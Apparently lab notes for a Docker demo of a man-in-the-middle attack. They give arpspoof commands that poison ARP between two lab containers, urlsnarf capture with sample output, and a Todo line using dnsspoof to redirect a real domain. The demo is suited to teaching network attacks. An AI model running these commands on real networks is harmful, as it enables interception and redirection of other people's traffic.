# Man in the Middle Attack

Ensure that packet forwarding is enabled.

```bash
sysctl -w net.ipv4.ip_forward=1
# or
echo 1 > /proc/sys/net/ipv4/ip_forward
```

Read current setting

```bash
# sysctl net.ipv4.ip_forward
net.ipv4.ip_forward = 1
```

To set permanently, edit /etc/sysctl.conf:


## Run Demo Attack


```bash
arpspoof -i eth0 -t 172.16.238.12 172.16.238.10
arpspoof -i eth0 -t 172.16.238.10 172.16.238.12
```

Sample arpspoof output

```
root@874e644e242e:/# arpspoof -i eth0 -t 172.16.238.10 172.16.238.12
2:42:ac:10:ee:b 2:42:ac:10:ee:a 0806 42: arp reply 172.16.238.12 is-at 2:42:ac:10:ee:b
2:42:ac:10:ee:b 2:42:ac:10:ee:a 0806 42: arp reply 172.16.238.12 is-at 2:42:ac:10:ee:b
2:42:ac:10:ee:b 2:42:ac:10:ee:a 0806 42: arp reply 172.16.238.12 is-at 2:42:ac:10:ee:b
...
```


Start a server on comp-a

```bash
python3 -m http.server 8080
```

Man in the middle

```
urlsnarf -i eth0
```

Curl from server comp-b

```bash
curl http://comp-a:8080/
```

Captured URL on Man in middle output

```bash
root@874e644e242e:/# urlsnarf -i eth0
urlsnarf: listening on eth0 [tcp port 80 or port 8080 or port 3128]


maninthemiddle_comp-b_1.maninthemiddle_app_net - - [28/May/2017:16:06:29 +0000] "GET http://comp-a:8080/ HTTP/1.1" - - "-" "curl/7.52.1"
```


Todo:

```
source: https://hub.docker.com/r/vimagick/dsniff/
>>> echo -e '192.168.31.1\twww.baidu.com' >> hosts
>>> dnsspoof -i eth0 -f hosts
```